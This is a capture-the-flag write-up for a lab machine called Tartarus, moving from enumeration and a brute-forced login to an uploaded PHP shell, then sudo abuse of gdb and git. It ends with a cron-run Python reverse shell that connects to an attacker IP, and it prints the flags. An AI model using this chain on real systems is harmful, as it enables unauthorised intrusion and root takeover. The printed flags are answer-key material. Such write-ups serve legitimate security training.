# Tartarus

### #1 User Flag
Starting with an nmap scan
```
nmap -sV <ip>
```
Got the information that anonymous is open in ftp and port 22 and port 80 is open.

Start a dirbuster scan to catch any directorys
```
dirbuster 

/robots.txt
/admin-dir/
```

Awaiting the scans, navigate around in ftp to check if there is any interesting and found a link to a loginpage.
```
/sUp3r-s3cr3t/
```

Used burpsuite to intersept post call, and ran a enum on the password. Found username and password to login
```
enox:P@ssword1234
```

Uploaded a php shell script to /sUp3r-s3cr3t/images/uploads/


Start lissener to get shell
```
nc -lnvp 1234
```

Send shell by navigating to the script http://<ip>/sUp3r-s3cr3t/images/uploads/phpshell.php.
```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Navigate to d4rckh to grab user flag abd cat out the first flag.
```
cat /home/d4rckh/user.txt
0f7dbb2243e692e3ad222bc4eff8521f
```

### #2 Root Flag   
Check what files we have access to run as root (or other users) without password.
```
sudo -l
(thirtytwo) NOPASSWD: /var/www/gdb
```

Become thirtytwo exploiting gdb
```
sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
```
See what that user can do
```
sudo -l
(d4rckh) NOPASSWD: /usr/bin/git
```

Get normal bash
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

Become d4rckh exploiting git
```
sudo -u d4rckh git -p help config
```

Write the code and save the file
```
!/bin/sh
```

Check if root does anything with the py script in home
```
cat /etc/crontab
```
Root user is running cleanup.py every two minutes.


Make a py script that makes me connect to shell
```
cd /home/d4rckh
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.100.167",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > cleanup.py
```

Start lissener on attacker shell
```
nc -lnvp 1234
```

Wait untill you get root
```
id
uid=0(root) gid=0(root) groups=0(root)
```

Cat out the root flag
```
cat /root/root.txt
7e055812184a5fa5109d5db5c7eda7cd
```
